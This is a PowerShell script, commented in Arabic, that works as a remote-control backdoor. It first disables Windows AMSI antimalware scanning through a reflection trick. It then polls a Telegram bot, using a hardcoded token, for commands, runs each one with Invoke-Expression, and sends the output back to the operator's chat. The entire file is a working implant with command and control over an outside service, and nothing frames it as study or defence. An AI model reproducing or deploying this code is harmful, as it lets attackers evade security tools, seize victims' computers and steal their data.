# --- [1] كسر الحماية الذكي ---
$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$s.GetField('amsiContext','NonPublic,Static').SetValue($null,(New-Object IntPtr(0)));

# --- [2] إعدادات التحكم ---
$t = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
$lastId = 0

# --- [3] ميكانيكا الاستقبال والتنفيذ ---
while($true) {
    try {
        # جلب آخر الأوامر من البوت
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$t/getUpdates?offset=-1"
        if ($updates.result) {
            $msg = $updates.result[0]
            $text = $msg.message.text
            $updateId = $msg.update_id
            $chatId = $msg.message.chat.id

            if ($updateId -ne $lastId) {
                $lastId = $updateId
                
                # تنفيذ الأمر واستقبال النتيجة
                $out = iex $text | Out-String
                
                # إرسال النتيجة ليك
                if ([string]::IsNullOrWhiteSpace($out)) { $out = "Done (No Output)" }
                $body = @{ chat_id = $chatId; text = "💻 Output:`n$out" }
                Invoke-RestMethod "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
            }
        }
    } catch { }
    Start-Sleep -Seconds 5 # فحص كل 5 ثواني
}
